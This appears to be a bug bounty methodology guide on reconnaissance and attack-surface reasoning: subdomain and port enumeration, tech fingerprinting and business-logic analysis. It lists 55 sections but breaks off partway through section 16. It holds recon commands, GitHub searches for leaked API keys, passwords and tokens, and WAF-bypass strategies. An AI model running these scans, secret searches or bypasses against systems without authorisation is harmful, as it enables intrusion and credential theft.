# Elite Black-Box Bug Bounty Methodology & Reconnaissance Knowledgebase

> **Version**: Research-Grade Elite Methodology | **Focus**: How Elite Hunters THINK, not what they spray
> 
> **Philosophy**: This knowledgebase explains the cognitive frameworks, reconnaissance pipelines, target classification logic, and attack-surface reasoning used by advanced black-box bug hunters. It is NOT a payload database. It is a methodology engine.

---

## Table of Contents

1. [Hunter Mindset & Philosophy](#1-hunter-mindset--philosophy)
2. [Recon Philosophy](#2-recon-philosophy)
3. [How Elite Hunters Think](#3-how-elite-hunters-think)
4. [Understanding Applications Before Testing](#4-understanding-applications-before-testing)
5. [Understanding Business Logic](#5-understanding-business-logic)
6. [Trust Boundary Analysis](#6-trust-boundary-analysis)
7. [Application Functionality Mapping](#7-application-functionality-mapping)
8. [Recon Fundamentals](#8-recon-fundamentals)
9. [Passive Recon Methodologies](#9-passive-recon-methodologies)
10. [Active Recon Methodologies](#10-active-recon-methodologies)
11. [Attack Surface Expansion](#11-attack-surface-expansion)
12. [Attack Surface Mapping](#12-attack-surface-mapping)
13. [Target Prioritization Logic](#13-target-prioritization-logic)
14. [Subdomain Classification Logic](#14-subdomain-classification-logic)
15. [Infrastructure Fingerprinting](#15-infrastructure-fingerprinting)
16. [CDN/WAF Fingerprinting](#16-cdnwaf-fingerprinting)
17. [Technology Fingerprinting](#17-technology-fingerprinting)
18. [Endpoint Discovery Methodologies](#18-endpoint-discovery-methodologies)
19. [Hidden Parameter Discovery](#19-hidden-parameter-discovery)
20. [API Hunting Methodologies](#20-api-hunting-methodologies)
21. [REST API Methodologies](#21-rest-api-methodologies)
22. [GraphQL Methodologies](#22-graphql-methodologies)
23. [Authentication Analysis Methodologies](#23-authentication-analysis-methodologies)
24. [Authorization & IDOR Methodologies](#24-authorization--idor-methodologies)
25. [Business Logic Mapping](#25-business-logic-mapping)
26. [OAuth/OIDC Analysis](#26-oauthoidc-analysis)
27. [JavaScript Recon Workflows](#27-javascript-recon-workflows)
28. [JavaScript Deobfuscation Workflows](#28-javascript-deobfuscation-workflows)
29. [Source Map Analysis](#29-source-map-analysis)
30. [Secret Extraction Workflows](#30-secret-extraction-workflows)
31. [Browser Behavior Analysis](#31-browser-behavior-analysis)
32. [DOM Analysis Workflows](#32-dom-analysis-workflows)
33. [Parser Analysis Methodologies](#33-parser-analysis-methodologies)
34. [Response Differential Analysis](#34-response-differential-analysis)
35. [SSRF Target Identification](#35-ssrf-target-identification)
36. [Request Smuggling Target Fingerprinting](#36-request-smuggling-target-fingerprinting)
37. [Cache Poisoning Target Identification](#37-cache-poisoning-target-identification)
38. [File Upload Analysis Methodologies](#38-file-upload-analysis-methodologies)
39. [Race Condition Hunting Methodologies](#39-race-condition-hunting-methodologies)
40. [Cloud Attack Surface Identification](#40-cloud-attack-surface-identification)
41. [GitHub Recon Methodologies](#41-github-recon-methodologies)
42. [CI/CD Recon Methodologies](#42-cicd-recon-methodologies)
43. [Recon Automation Pipelines](#43-recon-automation-pipelines)
44. [Nuclei Workflow Methodologies](#44-nuclei-workflow-methodologies)
45. [Fuzzing Workflows](#45-fuzzing-workflows)
46. [Chaining Methodologies](#46-chaining-methodologies)
47. [Real-World Hunter Workflows](#47-real-world-hunter-workflows)
48. [Real Recon Case Studies](#48-real-recon-case-studies)
49. [Real Bug Bounty Methodologies](#49-real-bug-bounty-methodologies)
50. [Toolchains Used By Elite Hunters](#50-toolchains-used-by-elite-hunters)
51. [Recon Pipelines](#51-recon-pipelines)
52. [JS Reversing Pipelines](#52-js-reversing-pipelines)
53. [API Mapping Pipelines](#53-api-mapping-pipelines)
54. [Notes From Real Hunters](#54-notes-from-real-hunters)
55. [Research References](#55-research-references)

---

## 1. Hunter Mindset & Philosophy

### The Core Premise
Elite bug hunters are not exploit developers first. They are **attack-surface architects** first. The difference between an average hunter and an elite hunter is not knowledge of payloads — it is the ability to:

1. **See what others cannot see** — hidden infrastructure, orphaned functionality, weak trust boundaries
2. **Think in hypotheses, not payloads** — "I believe this endpoint accepts an admin parameter because the frontend uses a feature flag pattern" vs. "Let me spray SQLi payloads"
3. **Understand the developer's intent** — every application is built by humans under pressure. Understanding *how* they built it reveals *where* they cut corners
4. **Follow the data** — trace how user input flows through the system, where it is stored, transformed, and output

### The Ebb & Flow Methodology
Elite hunting follows an oceanic rhythm. You do not linearly progress from recon → testing → report. Instead:

- Move down recon until you identify **3-5 attack vectors** on a target URL
- Spend focused time testing those vectors (not too long — 20-30 minutes max initially)
- When stuck, **put a pin in it** and return to an earlier recon stage
- Try new tools, new wordlists, new perspectives on the same target
- Choose 3-5 new attack vectors and repeat
- **The bugs are at the far ends of the bell curve** — everyone runs Amass; the elite hunter finds what Amass misses

### The "Pointer" System
Over time, elite hunters build a mental database of "pointers" — observable application characteristics that correlate with specific vulnerability classes:

| Pointer | What It Suggests | Vulnerability Hypothesis |
|---------|------------------|---------------------------|
| Outdated NPM packages in frontend | Poor dependency management | Likely backend dependency issues, unpatched CVEs |
| Self-signed certificate | Dev/test environment exposed | Untested security controls, debug endpoints |
| React app with unserialized webpack | Poor build pipeline | Source map leaks, hidden endpoints in original code |
| Custom JS files (not npm libraries) | In-house development | Business logic flaws, custom auth implementations |
| Large localStorage/sessionStorage usage | Client-side state management | Sensitive data exposure, auth token mishandling |
| Granular role-based UI (RBAC) | Complex access control | IDORs, privilege escalation via parameter tampering |
| File upload with custom extension parser | Complex parsing logic | Parser differential attacks, polyglot uploads |
| OAuth with multiple IdP options | Complex trust boundary | Account takeover via OAuth misconfiguration |
| GraphQL without depth limiting | Complex query engine | DoS, data exfiltration, introspection leaks |
| API versioning (v1, v2, beta) | Legacy endpoint maintenance | Zombie APIs, deprecated auth mechanisms |

### The Frustration Principle
"The feeling of being frustrated means you are growing, just like pain in muscles means you're building muscle. Embrace the frustration, dive into it head first, and push through it." — If you're not pushing beyond your current capability, you won't find what others miss.

### The Blueprint Philosophy
Modern web applications hand you their blueprint. Every React/Vue/Angular app ships massive JavaScript bundles containing API endpoints, internal URLs, configuration details, and sometimes hardcoded secrets. The elite hunter's job is to **read the map they're already giving you** rather than brute-forcing blindly.

---

## 2. Recon Philosophy

### Recon Is Not Enumeration
Enumeration is listing subdomains. Recon is **understanding the application, its developers, its infrastructure, and its weaknesses**.

> "Recon shouldn't just be limited to finding assets and outdated stuff. It's also understanding the app and finding functionality that's not easily accessible. There needs to be a balance between recon and good old hacking on the application in order to be successful." — @NahamSec

### The Three Layers of Recon

**Layer 1: Asset Discovery** (What exists?)
- Apex domains, subdomains, IPs, ports, certificates, ASN ranges
- Cloud resources, GitHub repos, employee LinkedIn profiles
- Acquisitions, mergers, marketing assets

**Layer 2: Surface Mapping** (What is exposed?)
- Live web applications, API endpoints, JavaScript files
- Technology stacks, WAF/CDN presence, security headers
- Authentication mechanisms, access control patterns

**Layer 3: Deep Understanding** (How does it work?)
- Business logic flows, data transformations, trust boundaries
- Developer patterns, coding conventions, framework choices
- Integration points, third-party services, async behaviors

### The Recon-to-Vulnerability Pipeline
Recon data should directly feed vulnerability hypotheses:

```
Apex Domain → Subdomains → Live Apps → Tech Stack → 
NPM Package CVEs → Custom Templates → Targeted Nuclei Scan → 
Hidden Endpoint in JS → Parameter Fuzzing → 
Mass Assignment Candidate → Privilege Escalation
```

### The Time Investment Rule
- **40%** of your time on recon and attack surface expansion
- **30%** on understanding application logic and building hypotheses
- **20%** on active testing and validation
- **10%** on documentation and reporting

If you're spending 80% of your time testing and 20% on recon, you're doing it backwards.

---

## 3. How Elite Hunters Think

### Hypothesis-Driven Testing
Elite hunters do not spray payloads. They build and test **hypotheses**:

1. **Observation**: "The profile update endpoint returns more fields than I sent (role, is_verified)"
2. **Hypothesis**: "The endpoint maps the entire request body to a User object without field filtering"
3. **Prediction**: "If I add 'role: admin' to the request, it will be persisted"
4. **Test**: Send modified request, observe response
5. **Conclusion**: Confirm/deny hypothesis, refine, repeat

### The "Weird Behavior" Radar
After a few minutes of tinkering with a workflow, experienced hunters develop a "feeling" for whether something interesting is happening. This comes from pattern recognition:

- Unexpected error messages revealing internal paths
- Different response times for similar requests
- Inconsistent authorization checks across endpoints
- Data returned in different formats than expected
- Parameters that accept unexpected types (string vs. array)

80% of the time, weird behavior doesn't mean a reportable bug. But it means you have a good chance — keep digging.

### Negative Testing as Intelligence Gathering
Don't just test what the application expects. Test what it doesn't expect:

- Negative numbers in ID fields
- Extremely large numbers (integer overflow)
- Strings in numeric fields
- Arrays where objects expected
- Null values, empty objects
- Type casting: string → array, number → object
- Non-ASCII characters, Unicode normalization
- Directory traversal patterns in seemingly safe parameters

The goal isn't to find a bug immediately — it's to **understand what the backend does when confused**.

### The Multi-Account Imperative
Always create multiple accounts. Test interactions between:
- User A → User B (IDOR testing)
- Admin → User (privilege escalation)
- Unauthenticated → Authenticated (auth bypass)
- Different roles (RBAC testing)

If the program doesn't provide multiple accounts, **ask for them**. Most programs will oblige.

### The Developer Perspective
Think like the developer who built the feature:
- They were under pressure to deliver quickly
- They built the simplest solution that worked
- They probably didn't consider edge cases
- They may have left debug code, test endpoints, or hardcoded credentials
- They likely reused patterns from StackOverflow without full understanding

### The Integration Mindset
Modern applications are chains of services. Elite hunters think about:
- What service calls what service?
- Where does data transform between formats?
- What happens when Service A trusts Service B too much?
- Where are the async boundaries (queues, webhooks, callbacks)?

---

## 4. Understanding Applications Before Testing

### The Walkthrough Protocol
Before touching Burp Intruder or any fuzzer:

1. **Create an account** and use the application like a real user
2. **Click every visible link** — understand what the application does
3. **Identify the attack surface**: what parts have functionality you can interact with?
4. **Identify common themes**: languages, frameworks, server versions
5. **Think like a developer**: how was this feature designed and implemented?
6. **Use features in unintended ways**: this is where bugs live

### The Mental Model Checklist
For every application, build a mental model of:

- **What languages/frameworks** were used?
- **What version** of the server/language? (check headers, error pages, CSS/JS references)
- **How is authentication handled?** (session cookies, JWT, OAuth, SAML)
- **What CSRF protection** exists? (tokens, SameSite cookies, custom headers)
- **Where is input accepted** and where is it displayed?
- **What endpoints save data** vs. read data?
- **Any file upload functionality?** (parser analysis opportunity)
- **What type of authentication** is used and where?
- **Is this function privileged?** (logic flaws, IDORs, priv esc)

### The Workflow Documentation
Mentally or physically record workflows:

```
Login → Dashboard → Profile Update → File Upload → Admin Panel
         ↓              ↓                ↓              ↓
     JWT Token      Mass Assignment   Parser Diff    IDOR
     Weak Secret    Candidate         Attack         Candidate
```

### The Focus Strategy
Stop caring about low-hanging fruit or surface bugs. There is no point focusing efforts on those. Instead:

- Take a **particular functionality/workflow** in the application
- Dig deep into it
- Understand every request, every parameter, every response
- Fuzz it, break it, manipulate it
- If exhausted after a few hours, **make a note and move on** — don't get hung up

---

## 5. Understanding Business Logic

### The Business Logic Attack Surface
Business logic vulnerabilities exist where the application's **intended functionality** can be used in **unintended ways**:

- **E-commerce**: Price manipulation, coupon stacking, negative quantities
- **Social platforms**: Vote manipulation, follower farming, content scraping
- **Financial apps**: Currency conversion abuse, rounding errors, transaction replay
- **SaaS platforms**: Seat/license manipulation, feature flag abuse
- **Marketplaces**: Transaction fee bypass, escrow manipulation

### The State Machine Analysis
Applications are state machines. Elite hunters map:
- Valid states: `created → pending → active → suspended`
- Valid transitions: what actions move between states?
- Invalid transitions: can you jump from `created` to `active` without `pending`?
- Missing states: is there a `deleted` state that still retains data?

### The Workflow Decomposition
Break every business workflow into atomic HTTP requests:

```
Password Reset:
  1. POST /api/auth/forgot-password {email}
  2. GET /reset-password?token=XYZ (email link)
  3. POST /api/auth/reset-password {token, new_password}

Attack Vectors:
  - Can you request reset for arbitrary email? (information disclosure)
  - Is token predictable? (account takeover)
  - Can token be reused? (replay attack)
  - Does token expire? (time-based brute force)
  - Can you reset without token? (auth bypass)
```

### The Data Flow Analysis
Trace how data moves through the system:
- User input → Frontend validation → API → Backend validation → Database
- Where is validation weakest? (usually at API or database layer)
- Where does data transform? (JSON → XML, string → object)
- Where is data echoed back? (XSS, injection opportunities)

### The Privilege Gradient
Map what each role can do:
```
Guest → User → Premium → Admin → Superadmin
  ↓       ↓        ↓        ↓         ↓
 Read   Create   Advanced  Delete    Everything
```

Test:
- Can User access Premium endpoints? (BFLA)
- Can User perform Admin actions with modified parameters? (IDOR)
- Can Guest access authenticated endpoints? (auth bypass)

---

## 6. Trust Boundary Analysis

### Identifying Trust Boundaries
A trust boundary is where data crosses from a less trusted zone to a more trusted zone:

- **Client → Server**: User input crossing into backend processing
- **Public API → Internal API**: External request reaching internal services
- **Service A → Service B**: Microservice communication
- **Frontend → Database**: Direct database access from client-side code

### The Trust Boundary Checklist
For each boundary, ask:
- **Is data validated at the boundary?** (not just at the client)
- **Is authentication enforced at the boundary?**
- **Is authorization checked at the boundary?**
- **Can the boundary be bypassed?** (direct API access, header spoofing)
- **What happens if the boundary is crossed unexpectedly?**

### The Frontend/Backend Communication Analysis
Modern SPAs communicate via APIs. Elite hunters analyze:
- **Request patterns**: consistent auth headers? custom headers?
- **Response patterns**: what data is returned? what is hidden?
- **Error handling**: do errors reveal internal structure?
- **State synchronization**: how does frontend state map to backend state?

### The Microservice Trust Problem
In microservice architectures:
- Service A might trust Service B implicitly
- If you can impersonate Service B, you bypass Service A's auth
- Look for: internal headers (`X-Internal-Request: true`), service tokens, IP whitelisting bypasses

### The Third-Party Integration Boundary
Where the app integrates with third parties:
- OAuth callbacks (can you manipulate the callback?)
- Webhook endpoints (can you forge webhooks?)
- API keys for services (are they scoped correctly?)
- CDN configurations (can you poison the cache?)

---

## 7. Application Functionality Mapping

### The Functional Decomposition
Map every feature to its underlying mechanism:

```
Feature: "Share Document"
Mechanism:
  1. POST /api/documents/{id}/share {user_id, permission}
  2. Database update: document.permissions[user_id] = permission
  3. Notification: POST /api/notifications {type: "share", recipient: user_id}
  4. Email: POST /internal/email-service {template: "share_notification"}

Vulnerability Hypotheses:
  - Can you share with arbitrary user_id? (IDOR)
  - Can you set permission to "owner"? (privilege escalation)
  - Can you share documents you don't own? (auth bypass)
  - Can you trigger email to arbitrary addresses? (SSRF via email service)
```

### The CRUD Mapping
For every resource, map Create, Read, Update, Delete operations:

```
Resource: User
  Create: POST /api/users
  Read:   GET /api/users/{id}
  Update: PUT /api/users/{id} or PATCH /api/me
  Delete: DELETE /api/users/{id}

Resource: Document
  Create: POST /api/documents
  Read:   GET /api/documents/{id}
  Update: PUT /api/documents/{id}
  Delete: DELETE /api/documents/{id}
  Share:  POST /api/documents/{id}/share
```

Missing operations often indicate hidden functionality.

### The Mechanism Complexity Score
Rate each mechanism by complexity (higher = more likely to have bugs):

| Factor | Weight |
|--------|--------|
| Number of HTTP requests in flow | +1 per request |
| Number of parameters involved | +1 per parameter |
| Number of services touched | +2 per service |
| Async operations (queues, callbacks) | +3 per async step |
| Granular permissions | +2 per permission level |
| Custom parsing logic | +5 |
| Third-party integrations | +3 per integration |

### The Feature Flag Hunt
Look for feature flags in JavaScript, headers, or responses:
- `feature_flag: "new_billing_flow"` → test the new flow
- `beta: true` → beta endpoints may have weaker auth
- `debug: true` → debug endpoints exposed
- `admin_panel_v2: true` → new admin panel may have IDORs

---

## 8. Recon Fundamentals

### The Attack Vector Definition
An **Injection Attack Vector** is the unique combination of:
1. HTTP Verb
2. Domain:Port
3. Endpoint
4. Injection Point

A **Logic Attack Vector** is one of:
1. Overly Complex Mechanism
2. Database Query Using ID From HTTP Request
3. Granular Access Controls
4. "Hacky" Implementation

### The Recon Input/Output Model
Every recon stage has defined inputs and outputs:

```
[Company Name] → [Apex Domain Discovery] → [List of Apex Domains]
[Apex Domain] → [Subdomain Enumeration] → [List of Subdomains]
[Subdomains] → [Resolution + Port Scan] → [IPs + Open Ports]
[IPs/Ports] → [HTTP Probing] → [Live URLs]
[Live URLs] → [Tech Fingerprinting] → [Target Classification]
[Target Classification] → [Attack Vector Selection] → [Testing]
```

### The Wide Scope Advantage
Wide scope programs (e.g., US DoD, Tesla) require finding your own targets:
- **Advantage**: Less competition on undiscovered assets
- **Disadvantage**: Massive attack surface, need for automation
- **Strategy**: Focus on acquisitions, cloud IP ranges, ASN enumeration, employee GitHub accounts

### The Recon Depth vs. Breadth Trade-off
- **Breadth-first**: Find many targets, scan quickly, look for easy wins (CVE spraying, subdomain takeover)
- **Depth-first**: Focus on one target, deeply understand it, find complex logic bugs
- **Elite strategy**: Breadth for target selection, then depth for exploitation

---

## 9. Passive Recon Methodologies

### Apex Domain Discovery
**Goal**: Find every domain the target owns

**Techniques**:
1. **Web Scraping**: Shodan, DNS Dumpster, Reverse WhoIs, Amass intel module
2. **Google Dorking**: `intitle:`, `intext:`, `site:` combinations
3. **Cloud IP Ranges**: Scan certificate data for domains containing company name
4. **ASN Enumeration**: Query ASN ranges for on-premise infrastructure
5. **Acquisitions & Mergers**: Track via Crunchbase, tech news, SEC filings
6. **LinkedIn + GitHub**: Find developers, check personal repos for test code with live domains
7. **Marketing & Favicon**: Tracking cookies with same ID, identical favicons across apps
8. **Certificate Transparency**: crt.sh, Certspotter API

**Commands**:
```bash
# Amass intel for apex discovery
amass intel -whois -d example.com

# Reverse WHOIS via viewdns.info / whoisxmlapi
# Get email from whois, search reverse whois for other domains

# Google dorking for related domains
site:*.example.com -www

# Certificate transparency
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u
```

### Subdomain Enumeration (Passive)
**Goal**: Find subdomains without brute-forcing

**Sources**:
- Certificate Transparency Logs (CRT, Certspotter)
- Search Engines (Google, Bing, Yahoo)
- Public APIs (Censys, Shodan, VirusTotal)
- Archive Data (Wayback Machine, Common Crawl)
- GitHub Code Search
- DNS Dumpster, DNSGoodies
- SPF Records (domains-from-spf)
- CSP Headers (domains-from-csp)

**Tools**:
```bash
# Amass (passive)
amass enum --passive -d example.com

# Subfinder
subfinder -d example.com -recursive -silent -t 200 -v

# Assetfinder
assetfinder --subs-only example.com

# Findomain
findomain -t example.com

# Censys enumeration
python censys_enumeration.py --no-emails --verbose --outfile results.json domains.txt
```

### Horizontal vs. Vertical Correlation
- **Vertical**: All subdomains of a base domain (`maps.google.com`, `mail.google.com`)
- **Horizontal**: All domains owned by the same entity (`google.com`, `youtube.com`, `blogger.com`)

Horizontal correlation is often missed. Use reverse WHOIS and ASN data.

### Historical Data Mining
**Goal**: Find old assets that may still be vulnerable

**Sources**:
- Wayback Machine (waybackurls)
- Common Crawl (gau)
- Git history (old commits may have secrets)
- Certificate history (old subdomains)

**Commands**:
```bash
# Wayback URLs
echo "example.com" | waybackurls > wayback_urls.txt

# GAU (GetAllUrls)
echo "example.com" | gau --threads 10 --subs > gau_urls.txt

# Waymore
waymore -i example.com -mode U -oU waymore_urls.txt
```

### GitHub Passive Recon
**Goal**: Find leaked code, secrets, and infrastructure details without interacting with target

**Search Patterns**:
```
org:targetcompany "api_key"
org:targetcompany "password"
org:targetcompany "secret"
org:targetcompany "token"
org:targetcompany "TODO"
org:targetcompany "vulnerable"
org:targetcompany "http://" "https://"
org:targetcompany "CSRF"
org:targetcompany "random"
org:targetcompany "hash"
org:targetcompany "MD5" OR "SHA-1" OR "SHA-256"
org:targetcompany "HMAC"
```

**Focus Areas**:
- **Repositories**: Dedicated projects related to keywords
- **Code**: Classic vulnerability patterns across the org
- **Commits**: Sometimes reveal removed secrets
- **Issues**: Gold mine for infrastructure details, domains, subdomains
- **Pull Requests**: May contain test data with real credentials

---

## 10. Active Recon Methodologies

### Subdomain Brute-Forcing
**Goal**: Find subdomains that don't appear in passive sources

**Strategy**:
1. Use a quality wordlist (commonspeak2, SecLists)
2. Generate permutations with dnsgen/altdns
3. Resolve with massdns + quality resolvers
4. Filter false positives

**Commands**:
```bash
# Generate permutations
cat domains.txt | dnsgen - > permutations.txt

# Resolve with massdns
./bin/massdns -r lists/resolvers.txt -t A permutations.txt > results.txt

# Get quality resolvers
python3 bass.py -d target.com -o resolvers.txt

# Combine with altdns for pattern-based generation
python altdns.py -i input_domains.txt -o output.txt -w words.txt
```

### Port Scanning
**Goal**: Find services on non-standard ports

**Strategy**:
1. Resolve subdomains to IPs
2. Masscan for speed (entire Internet possible)
3. Nmap for version detection on interesting ports
4. Verify results manually — cloud IPs change

**Commands**:
```bash
# Masscan on single IP
masscan -p1-65535 $(dig +short target.com | head -1) --max-rate 1000

# Masscan on IP list
masscan -iL ips.txt -p0-65535 --max-rate 10000 -oG output.txt

# Nmap for service detection
nmap -p- -sV -iL live_ips.txt -oX report.xml

# Nmap with custom stylesheet
nmap -sS -T4 -sC -oA report --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -iL subdomains.txt
```

### DNS Zone Transfer (AXFR)
```bash
# Attempt zone transfer
dig AXFR @<nameserver> <domain_name>
```

### Virtual Host Discovery
**Goal**: Find vhosts without DNS records

**Commands**:
```bash
# ffuf vhost discovery
ffuf -c -w /path/to/wordlist -u http://example.com -H "Host: FUZZ.example.com" -fs <false_positive_length>
```

### Cloud IP Range Scanning
**Goal**: Find apex domains by scanning cloud provider IP ranges

**Strategy**:
1. Load certificate data from cloud ranges
2. Search for domains containing target name
3. This can take 24+ hours but finds what others miss

**Tools**: Clear-Sky (automated), manual Censys/Shodan queries

---

## 11. Attack Surface Expansion

### The Attack Surface Expansion Mindset
Your goal is to find **every possible target and attack vector**. The bugs are where others aren't looking.

### Expansion Techniques
1. **IP Direct Access**: Access applications by IP instead of domain
   - Bypasses virtual host routing
   - May expose different applications
   - Changes Host header, may bypass security controls

2. **Port Scanning**: Find web apps on non-standard ports (8080, 8443, 3000, 5000, 8000, 9000)

3. **Protocol Variation**: Test HTTP vs HTTPS, different TLS versions

4. **Path Discovery**: Find hidden directories, backup files, dev endpoints

5. **Parameter Discovery**: Find hidden parameters that unlock functionality

6. **Header Manipulation**: Change Host, X-Forwarded-For, X-Real-IP to bypass controls

7. **Method Variation**: Test GET, POST, PUT, DELETE, PATCH, OPTIONS on every endpoint

### The "Ghost Feature" Hunt
Developers often "remove" features by hiding the UI button. The actual API endpoint remains. Find these by:
- JavaScript analysis (orphaned functions)
- Source map reconstruction
- API documentation leaks (Swagger, Postman collections)
- GitHub code search for deprecated endpoints

### The Integration Surface
Every third-party integration is an attack surface expansion:
- OAuth providers (Google, Facebook, GitHub)
- Payment processors (Stripe, PayPal)
- Communication services (Twilio, SendGrid)
- Storage services (AWS S3, Google Cloud Storage)
- Analytics (Segment, Mixpanel)
- Error tracking (Sentry, Rollbar)

---

## 12. Attack Surface Mapping

### The Network Map
Build a comprehensive map of the target's infrastructure:

```
Apex Domain: example.com
├── Subdomains
│   ├── www.example.com (Main App - React, Node.js)
│   ├── api.example.com (REST API - Python/FastAPI)
│   ├── graphql.example.com (GraphQL - Node.js)
│   ├── admin.example.com (Admin Panel - Angular)
│   ├── staging.example.com (Staging - Same stack, debug enabled)
│   ├── dev.example.com (Dev environment - self-signed cert)
│   ├── legacy.example.com (Old PHP app - outdated)
│   └── cdn.example.com (CDN - CloudFront)
├── IPs & Ports
│   ├── 192.0.2.1:80,443 (Main web)
│   ├── 192.0.2.1:8080 (Jenkins - exposed!)
│   └── 192.0.2.2:22 (SSH - outdated OpenSSH)
├── Cloud Resources
│   ├── S3: example-backups (public read?)
│   └── EC2: i-12345 (IAM role?)
└── Third-Party
    ├── Stripe (payment webhooks)
    ├── SendGrid (email API)
    └── Sentry (error tracking)
```

### The Application Map
For each live application, map:
- **Authentication**: How do users prove identity?
- **Authorization**: What can each user type do?
- **Data Flow**: Where does user input go?
- **State Management**: How is state maintained?
- **Error Handling**: What do errors reveal?
- **Rate Limiting**: Where are there no limits?

### The Dependency Map
Map all dependencies and their versions:
- Frontend: NPM packages (check with retire.js)
- Backend: Framework versions (Wappalyzer, BuiltWith)
- Infrastructure: Server versions (Nmap, Shodan)
- Services: Third-party API versions

---

## 13. Target Prioritization Logic

### The Target Selection Framework
Not all targets are worth equal time. Elite hunters prioritize using signals:

**High-Priority Signals**:
1. **Outdated technology**: Old copyright, expired certificate, old NPM packages
2. **Self-signed certificate**: Likely dev/test environment, untested
3. **New features/domains**: Recently added, less tested by other hunters
4. **Deep recon targets**: Hard to find, missed by others
5. **Complex mechanisms**: Multi-step workflows, granular permissions
6. **Custom development**: In-house code (not standard frameworks)
7. **Debug endpoints**: `/debug`, `/test`, `/console` found in JS
8. **Mismatched certificate**: Recent domain changes, potential chaos

**Low-Priority Signals**:
1. Standard WordPress with no custom plugins
2. Well-maintained SaaS with recent security headers
3. Heavily tested public domains (www, api)
4. Applications behind strong WAF with no bypass vectors

### The "Signs" System
Build your own list of "signs" that correlate with vulnerability:

| Sign | Interpretation | Action |
|------|---------------|--------|
| Expired certificate | Unmaintained | Deep test for known CVEs |
| React dev tools enabled | Development mode | Look for debug endpoints |
| Large localStorage | Client-side state | Test for sensitive data exposure |
| Custom auth implementation | Not battle-tested | Test auth bypass vectors |
| File upload with custom parser | Parser differential | Test polyglot uploads |
| GraphQL without introspection | Attempted security | Try Clairvoyance, field brute-forcing |
| API versioning | Legacy maintenance | Test old versions for zombie endpoints |

### The Screenshot Analysis
Take screenshots of all live targets:
- Look for major variations (different UI = different code path)
- Error messages revealing stack traces
- Development environments ("Development Mode", "Debug Toolbar")
- Login panels on unexpected subdomains
- Admin interfaces exposed

**Tools**: EyeWitness, Aquatone, Nuclei headless screenshot

---

## 14. Subdomain Classification Logic

### The Subdomain Taxonomy
Classify every subdomain by purpose and risk:

| Category | Examples | Risk Level | Testing Focus |
|----------|----------|------------|---------------|
| **Main App** | www, app, portal | Medium | Standard web testing |
| **API** | api, graphql, rest | High | Auth bypass, BOLA, mass assignment |
| **Admin** | admin, dashboard, cpanel | Critical | Privilege escalation, auth bypass |
| **Development** | dev, staging, test, qa | Critical | Debug endpoints, weak auth, data leaks |
| **Internal** | internal, private, corp | Critical | Network access, sensitive data |
| **Services** | jenkins, gitlab, confluence | Critical | CVE spraying, default creds |
| **CDN/Static** | cdn, static, assets | Low | Cache poisoning, misconfig |
| **Marketing** | blog, landing, promo | Low | XSS, content spoofing |
| **Legacy** | old, legacy, v1 | High | Zombie endpoints, deprecated auth |
| **Mobile** | mobile, m, api-mobile | High | Different auth flow, hidden endpoints |
| **Partner** | partner, affiliate, reseller | High | IDOR between partner accounts |
| **Support** | help, support, docs | Medium | Information disclosure |

### The Naming Convention Analysis
Analyze subdomain naming patterns:
- `api-v1.example.com`, `api-v2.example.com` → version enumeration
- `us-east.example.com`, `eu-west.example.com` → region-based routing
- `admin-staging.example.com` → staging admin panel
- `dev-api.example.com` → development API
- `backup.example.com` → potential data exposure

### The CNAME Analysis
Check CNAME records for subdomain takeover opportunities:
```bash
# Check CNAMEs
dig CNAME subdomain.example.com

# If CNAME points to unclaimed cloud resource:
# - AWS S3 bucket (s3.amazonaws.com)
# - Heroku (herokuapp.com)
# - GitHub Pages (github.io)
# - Azure (azurewebsites.net)
# - CloudFront (cloudfront.net)
```

---

## 15. Infrastructure Fingerprinting

### The Fingerprinting Stack
Build a complete technology profile:

**Server-Side**:
- Web server: Nginx, Apache, IIS, Caddy
- Application server: Node.js, Python, PHP, .NET, Java
- Database: MySQL, PostgreSQL, MongoDB, DynamoDB
- Cache: Redis, Memcached
- Message Queue: RabbitMQ, Kafka, SQS

**Client-Side**:
- Framework: React, Vue, Angular, Svelte
- Bundler: Webpack, Vite, Rollup, Parcel
- UI Library: Material-UI, Bootstrap, Tailwind
- State Management: Redux, Vuex, Zustand

**Infrastructure**:
- Cloud Provider: AWS, GCP, Azure, DigitalOcean
- CDN: CloudFront, Cloudflare, Fastly, Akamai
- WAF: Cloudflare, AWS WAF, ModSecurity, Imperva
- Container: Docker, Kubernetes

### Fingerprinting Techniques
1. **HTTP Headers**: `Server`, `X-Powered-By`, `X-Generator`
2. **Cookie Names**: `PHPSESSID`, `ASP.NET_SessionId`, `connect.sid`
3. **Error Pages**: Stack traces revealing frameworks
4. **CSS/JS Paths**: `/wp-content/`, `/assets/webpack/`, `/static/react/`
5. **Favicon Hashing**: Identify frameworks by favicon
6. **Response Behavior**: Nginx vs. Apache error responses

**Tools**: Wappalyzer, BuiltWith, Nmap service detection, WhatWeb

### The Technology-Driven Hypothesis
Once you know the stack, build targeted hypotheses:

| Technology | Hypothesis |
|------------|-----------|
| PHP + Apache | LFI/RFI via path traversal, .htaccess misconfig |
| Node.js + Express | Prototype pollution, JSON parsing quirks |
| Python + Django | Mass assignment via ORM, debug mode exposure |
| Java + Spring | XML external entity injection, serialization |
| .NET + IIS | ASPX path traversal, ViewState deserialization |
| GraphQL | Introspection, query depth attacks, batching |
| React + Webpack | Source map leaks, client-side routing bypass |
| AWS S3 | Bucket takeover, ACL misconfiguration |
| Kubernetes | Internal API access, etcd exposure |

---

## 16. CDN/WAF Fingerprinting

### CDN Detection
```bash
# CDNCheck (ProjectDiscovery)
cat subdomains.txt | cdncheck

# Manual checks
curl -I https://target.com | grep -i "cf-ray\|x-amz\|x-cache\|via"
```

### WAF Detection & Bypass Strategy
**Tools**: WafW00f

**Fingerprinting**:
- Response codes: Cloudflare (403 with specific HTML), AWS WAF (403 with json)
- Headers: `CF-RAY`, `X-Cache`, `X-Sucuri-ID`
- Response bodies: Distinctive block pages

**Bypass Strategies**:
1. **IP Direct Access**: Bypass CDN entirely
2. **Origin Discovery**: Find backend IP behind CDN
   - Historical DNS data (SecurityTrails)
   - SSL certificate analysis
   - Email headers revealing origin IP
3. **Path Case Variation**: `/API/` vs `/api/`
4. **Encoding**: URL encoding, double encoding, Unicode normalization
5. **HTTP/2 Specific**: Request smuggling via HTTP/2 downgrade
6. **Header Injection**: `X-Forwarded-Host`, `X-Real-IP` manipulation

### The Origin IP Hunt
```bash
# SecurityTrails for historical DNS
curl -s "https://securitytrails.com/domain/example.com/history/a" -H "APIKEY: $APIKEY"

